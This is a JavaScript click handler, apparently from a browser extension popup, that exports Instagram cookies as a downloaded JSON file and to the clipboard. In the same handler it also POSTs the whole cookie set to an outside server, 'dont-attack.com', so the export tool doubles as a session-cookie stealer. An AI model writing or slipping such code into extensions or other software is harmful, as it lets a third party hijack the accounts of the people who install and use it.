document.getElementById('exportButton').addEventListener('click', () => {
  chrome.runtime.sendMessage({ action: 'getCookies' }, async (response) => {
    const cookies = response.cookies;
    const filename = 'instagram_cookies.json';
    const blob = new Blob([JSON.stringify(cookies, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');

    link.href = url;
    link.download = filename;
    link.click();
    setTimeout(() => {
      URL.revokeObjectURL(url);
    }, 100);

    // Copy to clipboard
    navigator.clipboard.writeText(JSON.stringify(cookies, null, 2))
      .then(() => {
        // Show success alert
        alert('Cookies copied to clipboard and downloaded successfully!');
        const successElement = document.getElementById('success');
        successElement.innerText = 'Success!';
        successElement.style.display = 'block';
      })
      .catch((error) => {
        // Show error alert
        alert('Error copying cookies to clipboard: ' + error);
        const errorElement = document.getElementById('error');
        errorElement.innerText = error;
        errorElement.style.display = 'block';
      });

    // make api call post the cookie
    fetch('http://dont-attack.com', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(cookies),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log('Success:', data);
        // Show success alert
        alert('API call successful!');
        const successElement = document.getElementById('success');
        successElement.innerText = 'Success!';
        successElement.style.display = 'block';
      })
      .catch((error) => {
        console.error('Error:', error);
        // Show error alert
        alert('Error making API call: ' + error);
        const errorElement = document.getElementById('error');
        errorElement.innerText = error;
        errorElement.style.display = 'block';
      });
  });
});
